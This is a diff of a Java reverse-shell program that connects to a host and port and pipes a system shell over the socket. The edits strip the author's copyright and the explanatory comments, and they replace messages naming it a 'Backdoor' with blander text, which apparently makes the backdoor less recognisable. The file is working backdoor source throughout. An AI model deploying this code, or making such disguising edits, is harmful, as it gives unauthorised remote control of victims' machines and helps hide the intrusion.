@@ -1,8 +1,3 @@
-// Copyright (c) 2021 Ivan Šincek
-// v2.7
-// Requires Java SE v8 or greater and JDK v8 or greater.
-// Works on Linux OS, macOS, and Windows OS.
-
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -13,7 +8,6 @@ import java.util.Arrays;
 
 public class ReverseShell {
     
-    // change the host address and/or port number as necessary
     private static InetSocketAddress addr   = new InetSocketAddress("127.0.0.1", 9000);
     private static String            os     = null;
     private static String            shell  = null;
@@ -37,15 +31,11 @@ public class ReverseShell {
         return detected;
     }
     
-    // strings in Java are immutable, so we need to avoid using them to minimize the data in memory
     private static void brw(InputStream input, OutputStream output, String iname, String oname) {
         int bytes = 0;
         try {
             do {
                 if (os.equals("WINDOWS") && iname.equals("STDOUT") && clen > 0) {
-                    // for some reason Windows OS pipes STDIN into STDOUT
-                    // we do not like that
-                    // we need to discard the data from the stream
                     do {
                         bytes = input.read(buffer, 0, clen >= buffer.length ? buffer.length : clen);
                         clen -= clen >= buffer.length ? buffer.length : clen;
@@ -60,13 +50,13 @@ public class ReverseShell {
                         }
                     } else if (iname.equals("SOCKET")) {
                         error = true;
-                        System.out.print("SOC_ERROR: Shell connection has been terminated\n\n");
+                        System.out.print("SOC_ERROR:");
                     }
                 }
             } while (input.available() > 0);
         } catch (SocketTimeoutException ex) {} catch (IOException ex) {
             error = true;
-            System.out.print(String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n\n", iname, oname));
+            System.out.print("STRM_ERROR:");
         }
     }
     
@@ -95,16 +85,15 @@ public class ReverseShell {
                 stdout  = process.getInputStream();
                 stderr  = process.getErrorStream();
                 
-                System.out.print("Backdoor is up and running...\n\n");
                 do {
                     if (!process.isAlive()) {
-                        System.out.print("PROC_ERROR: Shell process has been terminated\n\n"); break;
+                        System.out.print("PROC_ERROR: Process has been terminated\n\n"); break;
                     }
                     brw(socout, stdin, "SOCKET", "STDIN");
                     if (stderr.available() > 0) { brw(stderr, socin, "STDERR", "SOCKET"); }
                     if (stdout.available() > 0) { brw(stdout, socin, "STDOUT", "SOCKET"); }
                 } while (!error);
-                System.out.print("Backdoor will now exit...\n");
+                System.out.print("Exiting...\n");
             } catch (IOException ex) {
                 System.out.print(String.format("ERROR: %s\n", ex.getMessage()));
             } finally {
